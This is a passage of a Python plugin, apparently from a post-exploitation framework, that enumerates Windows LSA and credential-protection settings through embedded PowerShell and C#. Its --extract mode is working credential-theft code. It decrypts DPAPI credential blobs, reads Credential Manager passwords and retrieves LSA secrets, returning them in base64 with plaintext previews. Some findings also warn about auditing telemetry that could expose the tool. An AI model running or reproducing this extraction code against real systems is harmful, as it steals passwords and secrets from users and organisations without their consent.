"""Windows LSA and credential security feature enumeration."""
import base64
import gzip
from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_list_section, format_section
from ..shared.runner import run_collector_plugin


# ---------------------------------------------------------------------------
# C# helper — LSA secret retrieval (LsaRetrievePrivateData) and Credential
# Manager access (CredRead / CredEnumerate) via advapi32 P/Invoke.
# Only used with --extract.
#   - LSA secret values require SYSTEM (or SeTcbPrivilege).
#   - CredRead succeeds for the current user's own credential vault.
# ---------------------------------------------------------------------------
_LSA_CS = r'''
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

public static class LsaApi
{
    // ------------------------------------------------------------------
    // LSA secrets (requires SYSTEM)
    // ------------------------------------------------------------------
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern uint LsaOpenPolicy(
        IntPtr SystemName,
        ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
        uint DesiredAccess,
        out IntPtr PolicyHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern uint LsaRetrievePrivateData(
        IntPtr PolicyHandle,
        ref LSA_UNICODE_STRING KeyName,
        out IntPtr PrivateData);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern uint LsaClose(IntPtr ObjectHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern uint LsaFreeMemory(IntPtr Buffer);

    public static byte[] RetrieveSecret(string keyName)
    {
        LSA_OBJECT_ATTRIBUTES oa = new LSA_OBJECT_ATTRIBUTES();
        IntPtr policyHandle = IntPtr.Zero;
        IntPtr privateData = IntPtr.Zero;
        IntPtr nameBuffer = IntPtr.Zero;
        try
        {
            uint status = LsaOpenPolicy(IntPtr.Zero, ref oa, 0x00000004, out policyHandle);
            if (status != 0) return null;

            LSA_UNICODE_STRING lus = new LSA_UNICODE_STRING();
            nameBuffer = Marshal.StringToHGlobalUni(keyName);
            lus.Buffer = nameBuffer;
            lus.Length = (ushort)(keyName.Length * 2);
            lus.MaximumLength = (ushort)((keyName.Length + 1) * 2);

            status = LsaRetrievePrivateData(policyHandle, ref lus, out privateData);
            if (status != 0) return null;

            LSA_UNICODE_STRING data = (LSA_UNICODE_STRING)Marshal.PtrToStructure(
                privateData, typeof(LSA_UNICODE_STRING));
            if (data.Length == 0 || data.Buffer == IntPtr.Zero) return new byte[0];

            byte[] result = new byte[data.Length];
            Marshal.Copy(data.Buffer, result, 0, data.Length);
            return result;
        }
        catch { return null; }
        finally
        {
            if (nameBuffer != IntPtr.Zero) Marshal.FreeHGlobal(nameBuffer);
            if (privateData != IntPtr.Zero) LsaFreeMemory(privateData);
            if (policyHandle != IntPtr.Zero) LsaClose(policyHandle);
        }
    }

    // ------------------------------------------------------------------
    // Credential Manager (CredRead / CredEnumerate)
    // ------------------------------------------------------------------
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIALW
    {
        public uint Flags;
        public uint Type;
        public IntPtr TargetName;
        public IntPtr Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist;
        public uint AttributeCount;
        public IntPtr Attributes;
        public IntPtr TargetAlias;
        public IntPtr UserName;
    }

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CredEnumerateW(
        string filter, uint flags, out uint count, out IntPtr credentials);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CredReadW(
        string target, uint type, uint flags, out IntPtr credential);

    [DllImport("advapi32.dll")]
    public static extern void CredFree(IntPtr buffer);

    // Returns one string per credential, formatted as
    //   "target|type|username"
    // PowerShell splits on the pipe. Username may be empty.
    public static string[] ListCredentials()
    {
        var result = new List<string>();
        IntPtr pList = IntPtr.Zero;
        uint count = 0;
        try
        {
            if (!CredEnumerateW(null, 0, out count, out pList)) return result.ToArray();
            for (uint i = 0; i < count; i++)
            {
                IntPtr pCred = Marshal.ReadIntPtr(pList, (int)(i * IntPtr.Size));
                if (pCred == IntPtr.Zero) continue;
                CREDENTIALW c = (CREDENTIALW)Marshal.PtrToStructure(pCred, typeof(CREDENTIALW));
                string target = c.TargetName != IntPtr.Zero ? Marshal.PtrToStringUni(c.TargetName) : "";
                string user   = c.UserName   != IntPtr.Zero ? Marshal.PtrToStringUni(c.UserName)   : "";
                result.Add(target + "|" + c.Type.ToString() + "|" + user);
            }
        }
        catch { }
        finally { if (pList != IntPtr.Zero) CredFree(pList); }
        return result.ToArray();
    }

    // Returns the raw credential blob. For CRED_TYPE_GENERIC the blob is
    // the UTF-16 encoded password -- caller decodes as needed.
    // Returns null on failure; empty array on a successful read of a
    // zero-length blob.
    public static byte[] ReadCredentialBlob(string target, uint type)
    {
        IntPtr pCred = IntPtr.Zero;
        try
        {
            if (!CredReadW(target, type, 0, out pCred)) return null;
            CREDENTIALW c = (CREDENTIALW)Marshal.PtrToStructure(pCred, typeof(CREDENTIALW));
            if (c.CredentialBlobSize == 0 || c.CredentialBlob == IntPtr.Zero) return new byte[0];
            byte[] blob = new byte[c.CredentialBlobSize];
            Marshal.Copy(c.CredentialBlob, blob, 0, (int)c.CredentialBlobSize);
            return blob;
        }
        catch { return null; }
        finally { if (pCred != IntPtr.Zero) CredFree(pCred); }
    }
}
'''


# ---------------------------------------------------------------------------
# PowerShell collector — plain raw string with @@TOKEN@@ placeholders.
# This avoids all f-string brace escaping.
# ---------------------------------------------------------------------------

_PS = r'''
$ErrorActionPreference='SilentlyContinue'
$start='@@START@@'; $end='@@END@@'
$DEEP=@@DEEP@@
$EXTRACT=@@EXTRACT@@
$NA='N/A'

# Coalesce: null / empty -> 'N/A'
function C([object]$v) {
  if ($null -eq $v) { return 'N/A' }
  if ($v -is [string] -and $v -eq '') { return 'N/A' }
  return $v
}

# ------------------------------------------------------------- OS + domain
$osBuild='N/A'
$domainInfo=@{ part_of_domain=$false; domain='N/A' }
try {
  $os=Get-CimInstance Win32_OperatingSystem -EA 0 -OperationTimeoutSec 8
  if ($os) { $osBuild="$($os.Caption) $($os.Version) (Build $($os.BuildNumber))" }
} catch {}
try {
  $cs=Get-CimInstance Win32_ComputerSystem -EA 0 -OperationTimeoutSec 8
  if ($cs) {
    $domainInfo.part_of_domain=[bool]$cs.PartOfDomain
    $domainInfo.domain=C $cs.Domain
  }
} catch {}

# ------------------------------------------------------------- LSA root
$lsa=@{}
$authPackages=@(); $secPackages=@(); $notifPackages=@()
try {
  $p=Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -EA 0
  if ($p) {
    $lsa=@{
      RunAsPPL=C $p.RunAsPPL
      RunAsPPLBoot=C $p.RunAsPPLBoot
      LmCompatibilityLevel=C $p.LmCompatibilityLevel
      LimitBlankPasswordUse=C $p.LimitBlankPasswordUse
      NoLMHash=C $p.NoLMHash
      RestrictAnonymous=C $p.RestrictAnonymous
      RestrictAnonymousSAM=C $p.RestrictAnonymousSAM
      EveryoneIncludesAnonymous=C $p.EveryoneIncludesAnonymous
      DisableDomainCreds=C $p.DisableDomainCreds
      UseLogonCredential=C $p.UseLogonCredential
      DisableRestrictedAdmin=C $p.DisableRestrictedAdmin
      DisableRestrictedAdminOutboundCreds=C $p.DisableRestrictedAdminOutboundCreds
      LsaCfgFlags=C $p.LsaCfgFlags
    }
    $authPackages=@($p.AuthenticationPackages | Select-Object -First 64)
    $secPackages=@($p.SecurityPackages | Select-Object -First 64)
    if ($p.'Notification Packages') {
      $notifPackages=@($p.'Notification Packages' | Select-Object -First 64)
    }
  }
} catch {}

# ------------------------------------------------------------- MSV1_0 (NTLM)
$ntlm=@{}
try {
  $m=Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' -EA 0
  if ($m) {
    $ntlm=@{
      NTLMMinClientSec=C $m.NTLMMinClientSec
      NTLMMinServerSec=C $m.NTLMMinServerSec
      RestrictSendingNTLMTraffic=C $m.RestrictSendingNTLMTraffic
      RestrictReceivingNTLMTraffic=C $m.RestrictReceivingNTLMTraffic
      AuditReceivingNTLMTraffic=C $m.AuditReceivingNTLMTraffic
      AllowOnlineReset=C $m.AllowOnlineReset
    }
  }
} catch {}

# ------------------------------------------------------------- Kerberos
$kerberos=@{}
try {
  $k=Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters' -EA 0
  if ($k) {
    $kerberos=@{
      MaxTicketAge=C $k.MaxTicketAge
      MaxRenewAge=C $k.MaxRenewAge
      MaxServiceAge=C $k.MaxServiceAge
      MaxClockSkew=C $k.MaxClockSkew
      TicketValidateClient=C $k.TicketValidateClient
    }
  }
} catch {}

# ------------------------------------------------------------- Winlogon
$winlogon=@{}
try {
  $w=Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -EA 0
  if ($w) {
    $winlogon=@{
      CachedLogonsCount=C $w.CachedLogonsCount
      DisableCAD=C $w.DisableCAD
    }
  }
} catch {}

# ------------------------------------------------------------- DeviceGuard (VBS)
$deviceGuard=@{}
try {
  $dg=Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard `
        -ClassName Win32_DeviceGuard -EA 0 -OperationTimeoutSec 8
  if ($dg) {
    $deviceGuard=@{
      AvailableSecurityProperties=@($dg.AvailableSecurityProperties)
      RequiredSecurityProperties=@($dg.RequiredSecurityProperties)
      SecurityServicesConfigured=@($dg.SecurityServicesConfigured)
      SecurityServicesRunning=@($dg.SecurityServicesRunning)
      VirtualizationBasedSecurityStatus=C $dg.VirtualizationBasedSecurityStatus
      CodeIntegrityPolicyEnforcementStatus=C $dg.CodeIntegrityPolicyEnforcementStatus
    }
  }
} catch {}

# ------------------------------------------------------------- Credential Guard config
$credGuard=@{}
try {
  $cgPath='HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
  if (Test-Path $cgPath) {
    $cg=Get-ItemProperty $cgPath -EA 0
    $credGuard=@{
      EnableVirtualizationBasedSecurity=C $cg.EnableVirtualizationBasedSecurity
      RequirePlatformSecurityFeatures=C $cg.RequirePlatformSecurityFeatures
      Locked=C $cg.Locked
      LsaCfgFlags=C $cg.LsaCfgFlags
    }
  }
  $lk=Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -EA 0
  if ($lk -and $lk.LsaCfgFlags -ne $null) {
    $credGuard['lsa_cfg_flags']=$lk.LsaCfgFlags
  }
} catch {}

# ------------------------------------------------------------- HVCI
$vbs=@{}
try {
  $hvci='HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity'
  if (Test-Path $hvci) {
    $vbs['hvci']=C (Get-ItemProperty $hvci -EA 0).Enabled
  }
} catch {}

# ------------------------------------------------------------- Secure Boot
$secureBoot='N/A'
try { $secureBoot=(Confirm-SecureBootUEFI -EA Stop) } catch { $secureBoot='N/A' }

# ------------------------------------------------------------- WDigest
$wdigest=@{ UseLogonCredential='N/A' }
try {
  $wdPath='HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
  if (Test-Path $wdPath) {
    $wdigest['UseLogonCredential']=C (Get-ItemProperty $wdPath -EA 0).UseLogonCredential
  }
} catch {}

# ------------------------------------------------------------- TPM
$tpm=@{ present=$false }
try {
  $t=Get-CimInstance -Namespace root\CIMV2\Security\MicrosoftTpm `
        -ClassName Win32_Tpm -EA 0 -OperationTimeoutSec 8
  if ($t) {
    $tpm=@{
      present=$true
      enabled=C $t.IsEnabled_InitialValue
      activated=C $t.IsActivated_InitialValue
      owned=C $t.IsOwned_InitialValue
      spec_version=C $t.SpecVersion
      manufacturer_id=C $t.ManufacturerId
      manufacturer_version=C $t.ManufacturerVersion
      locked_out=C $t.IsLockedOut
    }
  }
} catch {}

# ------------------------------------------------------------- Token privileges
$privSummary=@{}
try {
  if (Get-Command whoami.exe -EA 0) {
    $raw=& whoami.exe /priv 2>$null
    foreach ($line in @($raw)) {
      if (-not $line) { continue }
      # Split on 2+ spaces — whoami pads columns
      $parts = $line -split '\s{2,}'
      if ($parts.Length -ge 3 -and $parts[0].Trim() -like 'Se*Privilege') {
        $privSummary[$parts[0].Trim()] = $parts[-1].Trim()
      }
    }
  }
} catch {}

# ------------------------------------------------------------- Audit policy
$auditPolicy=@{ available=$false; registry_subcategory='N/A' }
try {
  if (Get-Command auditpol.exe -EA 0) {
    $apOut=& auditpol.exe /get /subcategory:'Registry' 2>$null
    if ($apOut) {
      $auditPolicy['available']=$true
      $joined=($apOut | Out-String)
      if     ($joined -match 'Success and Failure') { $auditPolicy['registry_subcategory']='Success and Failure' }
      elseif ($joined -match 'Failure')             { $auditPolicy['registry_subcategory']='Failure' }
      elseif ($joined -match 'Success')             { $auditPolicy['registry_subcategory']='Success' }
      elseif ($joined -match 'No Auditing')         { $auditPolicy['registry_subcategory']='No Auditing' }
    }
  }
} catch {}

# ------------------------------------------------------------- LAPS
$laps=@{ legacy_dll=$false; windows_laps=$false; policy_configured=$false }
try {
  if (Test-Path 'C:\Program Files\LAPS\CSE\AdmPwd.dll') { $laps['legacy_dll']=$true }
  if (Test-Path 'C:\Windows\System32\Laps.dll')          { $laps['windows_laps']=$true }
  foreach ($k in @(
    'HKLM:\SOFTWARE\Microsoft\Policies\LAPS',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS',
    'HKLM:\SOFTWARE\Policies\Microsoft\Windows\LAPS'
  )) {
    if (Test-Path $k) { $laps['policy_configured']=$true }
  }
} catch {}

# ------------------------------------------------------------- DPAPI enumeration
$dpapi=@{
  skipped=(-not $DEEP)
  user_credentials=@()
  user_master_keys=@()
  system_master_keys=@()
  user_protect_readable='N/A'
  extracted=@()
}

if ($DEEP) {
  try {
    $profiles=Get-ChildItem 'C:\Users' -Directory -Force -EA 0
    foreach ($up in @($profiles)) {
      $uname=$up.Name
      foreach ($rel in @(
        'AppData\Roaming\Microsoft\Credentials',
        'AppData\Local\Microsoft\Credentials'
      )) {
        $cp=Join-Path $up.FullName $rel
        if (-not (Test-Path $cp)) { continue }
        $files=Get-ChildItem $cp -File -Force -EA 0 | Select-Object -First 30
        foreach ($f in @($files)) {
          $dpapi.user_credentials += @{
            user=$uname; name=$f.Name; size=$f.Length
            mtime=$f.LastWriteTime.ToString('s')
          }
        }
      }
      $mp=Join-Path $up.FullName 'AppData\Roaming\Microsoft\Protect'
      if (Test-Path $mp) {
        $sidDirs=Get-ChildItem $mp -Directory -Force -EA 0
        foreach ($sd in @($sidDirs)) {
          $keys=Get-ChildItem $sd.FullName -File -Force -EA 0 | Select-Object -First 30
          foreach ($kk in @($keys)) {
            $dpapi.user_master_keys += @{
              user=$uname; sid=$sd.Name; guid=$kk.Name
              mtime=$kk.LastWriteTime.ToString('s')
            }
          }
        }
        try {
          $null=Get-ChildItem $mp -File -Force -EA Stop
          $dpapi.user_protect_readable=$true
        } catch { $dpapi.user_protect_readable=$false }
      }
    }
    # System master keys — one level only, no -Recurse (can be huge)
    $sysmp='C:\Windows\System32\Microsoft\Protect'
    if (Test-Path $sysmp) {
      $sysDirs=Get-ChildItem $sysmp -Directory -Force -EA 0 | Select-Object -First 30
      foreach ($sd in @($sysDirs)) {
        $dpapi.system_master_keys += @{
          sid=$sd.Name; mtime=$sd.LastWriteTime.ToString('s')
        }
      }
    }
  } catch {}
}

# ------------------------------------------------------------- DPAPI extraction
if ($EXTRACT -and $DEEP) {
  try { Add-Type -AssemblyName System.Security -EA 0 | Out-Null } catch {}
  $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
  $candidates=@()
  # Only the current user's own blobs are decryptable in-process
  $myDirs=@(
    (Join-Path $env:APPDATA 'Microsoft\Credentials'),
    (Join-Path $env:LOCALAPPDATA 'Microsoft\Credentials')
  )
  foreach ($d in $myDirs) {
    if (Test-Path $d) {
      $candidates += Get-ChildItem $d -File -Force -EA 0 | Select-Object -First 8
    }
  }
  foreach ($b in @($candidates)) {
    $entry=@{ name=$b.Name; status='N/A'; value_b64='N/A'; value_preview='N/A' }
    try {
      $raw=[System.IO.File]::ReadAllBytes($b.FullName)
      $plain=[System.Security.Cryptography.ProtectedData]::Unprotect($raw, $null, $scope)
      if ($plain -and $plain.Length -gt 0) {
        $entry.status='decrypted'
        $cap = [Math]::Min($plain.Length, 1024)
        $slice = $plain[0..($cap-1)]
        $entry.value_b64=[Convert]::ToBase64String($slice)
        try {
          $txt=[System.Text.Encoding]::Unicode.GetString($slice)
          $txt=$txt -replace '[^\x20-\x7E]', '.'
          $entry.value_preview=$txt
        } catch {}
      } else {
        $entry.status='empty'
      }
    } catch {
      $entry.status='N/A'
    }
    $dpapi.extracted += $entry
  }
}

# ------------------------------------------------------------- LSA secrets (names)
$lsaSecrets=@{ skipped=(-not $DEEP); readable=$false; names=@(); extracted=@(); extract_status='N/A' }
if ($DEEP) {
  try {
    $items=Get-ChildItem 'HKLM:\SECURITY\Policy\Secrets' -EA Stop | Select-Object -First 40
    $names=@()
    foreach ($it in @($items)) { $names += $it.PSChildName }
    $lsaSecrets['names']=@($names)
    $lsaSecrets['readable']=$true
  } catch {
    $lsaSecrets['readable']=$false
  }
}

# ------------------------------------------------------------- LSA secrets extraction
if ($EXTRACT -and $DEEP) {
  $loaded=$false
  try {
    $csSrc=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('@@LSA_BOOTSTRAP@@'))
    Add-Type -TypeDefinition $csSrc -Language CSharp -EA Stop
    $loaded=$true
    $lsaSecrets['extract_status']='api_loaded'
  } catch {
    $lsaSecrets['extract_status']='api_load_failed'
  }

  if ($loaded) {
    $anySuccess=$false
    foreach ($n in @($lsaSecrets.names)) {
      if (-not $n) { continue }
      $entry=@{ name=$n; status='N/A'; value_b64='N/A' }
      try {
        $bytes=[LsaApi]::RetrieveSecret([string]$n)
        if ($null -eq $bytes) {
          $entry.status='N/A'
        } else {
          $entry.status='decrypted'
          $anySuccess=$true
          if ($bytes.Length -gt 1024) { $bytes = $bytes[0..1023] }
          $entry.value_b64=[Convert]::ToBase64String($bytes)
        }
      } catch { $entry.status='N/A' }
      $lsaSecrets.extracted += $entry
    }
    if ($anySuccess) { $lsaSecrets['extract_status']='ok' }
    elseif ($lsaSecrets.names.Count -gt 0) { $lsaSecrets['extract_status']='not_privileged' }
  }
}

# ------------------------------------------------------------- Derived state
$lsaProtected = (($lsa.RunAsPPL -in 1,2) -or ($lsa.RunAsPPLBoot -in 1,2))
$lsaUefiLocked = ($lsa.RunAsPPLBoot -in 1,2)

$cgCfg = $credGuard.LsaCfgFlags
if ($null -eq $cgCfg -or $cgCfg -eq 'N/A') { $cgCfg = $credGuard.lsa_cfg_flags }
$cgConfigured = ($cgCfg -in 1,2,3)

$ssr=0
foreach ($v in @($deviceGuard.SecurityServicesRunning)) {
  if ($v -and $v -ne 'N/A') { $ssr = $ssr -bor [int]$v }
}
$cgRunning   = (($ssr -band 1) -eq 1)
$hvciRunning = (($ssr -band 2) -eq 1)

$vbsLabels=@()
if ($cgRunning)   { $vbsLabels += 'CredentialGuard' }
if ($hvciRunning) { $vbsLabels += 'HVCI' }

$vbsStatusMap=@{ 0='Off'; 1='Enabled (not running)'; 2='Running'; 3='Running (UMCI enforced)' }
$vbsStatusRaw=$deviceGuard.VirtualizationBasedSecurityStatus
$vbsStatusText='N/A'
if ($vbsStatusRaw -ne $null -and $vbsStatusRaw -ne 'N/A') {
  try { $vbsStatusText=$vbsStatusMap[[int]$vbsStatusRaw] } catch {}
}

$wdacMap=@{ 0='Off'; 1='Audit mode'; 2='Enforced' }
$wdacRaw=$deviceGuard.CodeIntegrityPolicyEnforcementStatus
$wdacText='N/A'
if ($wdacRaw -ne $null -and $wdacRaw -ne 'N/A') {
  try { $wdacText=$wdacMap[[int]$wdacRaw] } catch {}
}

# ------------------------------------------------------------- Findings
$findings=@()
if (-not $lsaProtected) {
  $findings += @{ kind='lsa_ppl'; severity='high'; detail='LSA not running as Protected Process Light' }
} elseif ($lsaProtected -and -not $lsaUefiLocked) {
  $findings += @{ kind='lsa_ppl_no_uefi_lock'; severity='medium'; detail='LSA PPL set via RunAsPPL only -- not hardware-locked' }
}

if (-not $cgConfigured) {
  $findings += @{ kind='credential_guard'; severity='medium'; detail='Credential Guard not configured' }
} elseif ($cgConfigured -and -not $cgRunning) {
  $findings += @{ kind='credential_guard'; severity='high'; detail='Credential Guard configured but not running' }
}

if ($wdigest.UseLogonCredential -eq 1) {
  $findings += @{ kind='wdigest'; severity='high'; detail='Plaintext logon credentials cached (UseLogonCredential=1)' }
}

if ($ntlm.RestrictSendingNTLMTraffic -ne 'N/A' -and $ntlm.RestrictSendingNTLMTraffic -ne $null -and [int]$ntlm.RestrictSendingNTLMTraffic -lt 2) {
  $findings += @{ kind='ntlm_outbound'; severity='medium'; detail='Outbound NTLM not restricted' }
}
if ($ntlm.RestrictReceivingNTLMTraffic -ne 'N/A' -and $ntlm.RestrictReceivingNTLMTraffic -ne $null -and [int]$ntlm.RestrictReceivingNTLMTraffic -eq 0) {
  $findings += @{ kind='ntlm_inbound'; severity='medium'; detail='Inbound NTLM not restricted' }
}
if ($ntlm.NTLMMinClientSec -ne 'N/A' -and $ntlm.NTLMMinClientSec -ne $null -and [int]$ntlm.NTLMMinClientSec -ne 0x20000000) {
  $findings += @{ kind='ntlm_minsec'; severity='low'; detail='NTLMMinClientSec != 0x20000000 (NTLMv2 not required)' }
}

if ($winlogon.CachedLogonsCount -ne 'N/A' -and $winlogon.CachedLogonsCount -ne $null -and [int]$winlogon.CachedLogonsCount -gt 0) {
  if ($domainInfo.part_of_domain) {
    $findings += @{ kind='cached_logons'; severity='medium'; detail="CachedLogonsCount=$($winlogon.CachedLogonsCount) on domain-joined host -- DCC2 hashes may be present" }
  } else {
    $findings += @{ kind='cached_logons'; severity='low'; detail="CachedLogonsCount=$($winlogon.CachedLogonsCount)" }
  }
}

if ($kerberos.MaxTicketAge -ne 'N/A' -and $kerberos.MaxTicketAge -ne $null -and [int]$kerberos.MaxTicketAge -gt 10) {
  $findings += @{ kind='kerberos_ticket_age'; severity='low'; detail="MaxTicketAge=$($kerberos.MaxTicketAge)h exceeds 10h" }
}

if ($secureBoot -eq $false) {
  $findings += @{ kind='secure_boot'; severity='medium'; detail='Secure Boot disabled' }
}
if (-not $tpm.present -and $cgConfigured) {
  $findings += @{ kind='credguard_tpm'; severity='high'; detail='Credential Guard configured but no TPM present' }
}

if ($lsa.LmCompatibilityLevel -ne 'N/A' -and $lsa.LmCompatibilityLevel -ne $null -and [int]$lsa.LmCompatibilityLevel -lt 5) {
  $findings += @{ kind='lm_compat'; severity='medium'; detail="LmCompatibilityLevel=$($lsa.LmCompatibilityLevel) (<5)" }
}

if ($wdacRaw -eq 2) {
  $findings += @{ kind='wdac_enforced'; severity='high'; detail='WDAC enforced -- unsigned in-memory execution blocked' }
} elseif ($wdacRaw -eq 1) {
  $findings += @{ kind='wdac_audit'; severity='info'; detail='WDAC in audit mode' }
}

if ($privSummary['SeDebugPrivilege'] -eq 'Enabled') {
  $findings += @{ kind='sedebug'; severity='high'; detail='SeDebugPrivilege enabled' }
}
if ($privSummary['SeImpersonatePrivilege'] -eq 'Enabled') {
  $findings += @{ kind='seimpersonate'; severity='medium'; detail='SeImpersonatePrivilege enabled' }
}

if ($auditPolicy.registry_subcategory -eq 'Success' -or $auditPolicy.registry_subcategory -eq 'Success and Failure') {
  $findings += @{ kind='registry_audit'; severity='info'; detail='Registry auditing enabled -- this plugin may generate telemetry' }
}

if ($laps.policy_configured -or $laps.windows_laps -or $laps.legacy_dll) {
  $findings += @{ kind='laps'; severity='info'; detail='LAPS deployed' }
}

if ($DEEP) {
  if ($dpapi.user_protect_readable -eq $true) {
    $findings += @{ kind='dpapi_readable'; severity='medium'; detail='DPAPI master key directory readable by current user' }
  }
  if ($lsaSecrets.readable) {
    $findings += @{ kind='lsa_secrets_readable'; severity='high'; detail='LSA Secrets key enumerable' }
  }
  if ($EXTRACT -and $lsaSecrets.extract_status -eq 'not_privileged') {
    $findings += @{ kind='lsa_secrets_no_priv'; severity='info'; detail='LSA secret values not extractable from current context (needs SYSTEM)' }
  }
}

# ------------------------------------------------------------- Assemble
try {
  $result=[ordered]@{
    summary=@{
      os_build=$osBuild
      domain_joined=$domainInfo.part_of_domain
      domain=$domainInfo.domain
      lsa_protection=$lsaProtected
      lsa_uefi_locked=$lsaUefiLocked
      credential_guard_configured=$cgConfigured
      credential_guard_running=$cgRunning
      vbs_status=$vbsStatusRaw
      vbs_status_text=$vbsStatusText
      vbs_services_running=($vbsLabels -join ',')
      wdac_status=$wdacRaw
      wdac_status_text=$wdacText
      wdigest_enabled=($wdigest.UseLogonCredential -eq 1)
      secure_boot=$secureBoot
      tpm_present=[bool]$tpm.present
      laps_deployed=($laps.legacy_dll -or $laps.windows_laps -or $laps.policy_configured)
      deep_scan=$DEEP
      extract_mode=$EXTRACT
    }
    findings=$findings
    lsa=$lsa
    ntlm=$ntlm
    kerberos=$kerberos
    winlogon=$winlogon
    device_guard=$deviceGuard
    credential_guard=$credGuard
    virtualization_based_security=$vbs
    wdigest=$wdigest
    token_privileges=$privSummary
    audit_policy=$auditPolicy
    laps=$laps
    domain=$domainInfo
    authentication_packages=$authPackages
    security_packages=$secPackages
    notification_packages=$notifPackages
    dpapi=$dpapi
    lsa_secrets=$lsaSecrets
    tpm=$tpm
  }
} catch {
  $result=[ordered]@{
    summary=@{
      error=$_.Exception.Message
      deep_scan=$DEEP
      extract_mode=$EXTRACT
    }
    findings=@()
    error=$_.Exception.Message
    stack=$_.ScriptStackTrace
  }
}

Write-Output ($start + (ConvertTo-Json $result -Depth 8 -Compress) + $end)
'''


# ---------------------------------------------------------------------------
# PowerShell — extraction only (no posture enumeration). Used by --extract.
# ---------------------------------------------------------------------------
_PS_EXTRACT = r'''
$ErrorActionPreference='SilentlyContinue'
$start='@@START@@'; $end='@@END@@'

# --- Credential Manager (current user) ---
$dpapi_extracted=@()
$apiOk=$false
try {
  $csSrc=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('@@LSA_BOOTSTRAP@@'))
  Add-Type -TypeDefinition $csSrc -Language CSharp -EA Stop
  $apiOk=$true
} catch {
  $dpapi_extracted += @{
    name='(api)'; status='api_load_failed'
    error=$_.Exception.Message
    value_b64='N/A'; value_preview='N/A'
  }
}

if ($apiOk) {
  foreach ($line in @([LsaApi]::ListCredentials())) {
    if (-not $line) { continue }
    $parts = $line -split '\|', 3
    if ($parts.Length -lt 2) { continue }
    $target = $parts[0]
    $ctype  = [uint32]$parts[1]
    $user   = if ($parts.Length -ge 3) { $parts[2] } else { '' }

    $entry=@{
      name=$target; type=$ctype; user=$user
      status='N/A'; error=''; value_b64='N/A'; value_preview='N/A'
    }
    try {
      $bytes=[LsaApi]::ReadCredentialBlob($target, $ctype)
      if ($null -eq $bytes) {
        $entry.status='N/A'
        $entry.error='CredRead returned false'
      } elseif ($bytes.Length -eq 0) {
        $entry.status='empty'
      } else {
        $entry.status='decrypted'
        $cap=[Math]::Min($bytes.Length, 1024)
        $slice=$bytes[0..($cap-1)]
        $entry.value_b64=[Convert]::ToBase64String($slice)
        try {
          $txt=[System.Text.Encoding]::Unicode.GetString($slice)
          $txt=$txt -replace '[^\x20-\x7E]', '.'
          $entry.value_preview=$txt
        } catch {}
      }
    } catch {
      $entry.status='N/A'
      $entry.error=$_.Exception.Message
    }
    $dpapi_extracted += $entry
  }
}

# --- LSA secrets (needs SYSTEM for values) ---
$lsa_extracted=@()
$lsa_extract_status='api_not_loaded'
try {
  $csSrc=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('@@LSA_BOOTSTRAP@@'))
  Add-Type -TypeDefinition $csSrc -Language CSharp -EA Stop
  $lsa_extract_status='api_loaded'
} catch { $lsa_extract_status='api_load_failed' }

if ($lsa_extract_status -eq 'api_loaded') {
  $names=@()
  try {
    $items=Get-ChildItem 'HKLM:\SECURITY\Policy\Secrets' -EA Stop | Select-Object -First 40
    foreach ($it in @($items)) { $names += $it.PSChildName }
  } catch {}
  $anySuccess=$false
  foreach ($n in @($names)) {
    if (-not $n) { continue }
    $entry=@{ name=$n; status='N/A'; value_b64='N/A' }
    try {
      $bytes=[LsaApi]::RetrieveSecret([string]$n)
      if ($null -eq $bytes) { $entry.status='N/A' }
      else {
        $entry.status='decrypted'; $anySuccess=$true
        if ($bytes.Length -gt 1024) { $bytes = $bytes[0..1023] }
        $entry.value_b64=[Convert]::ToBase64String($bytes)
      }
    } catch { $entry.status='N/A' }
    $lsa_extracted += $entry
  }
  if ($anySuccess) { $lsa_extract_status='ok' }
  elseif ($names.Count -gt 0) { $lsa_extract_status='not_privileged' }
}

$result=[ordered]@{
  summary=@{
    mode='extract'
    dpapi_blobs=$dpapi_extracted.Count
    lsa_extract_status=$lsa_extract_status
  }
  dpapi_extracted=$dpapi_extracted
  lsa_extract_status=$lsa_extract_status
  lsa_extracted=$lsa_extracted
}
Write-Output ($start + (ConvertTo-Json $result -Depth 6 -Compress) + $end)
'''


# ---------------------------------------------------------------------------
# Formatter
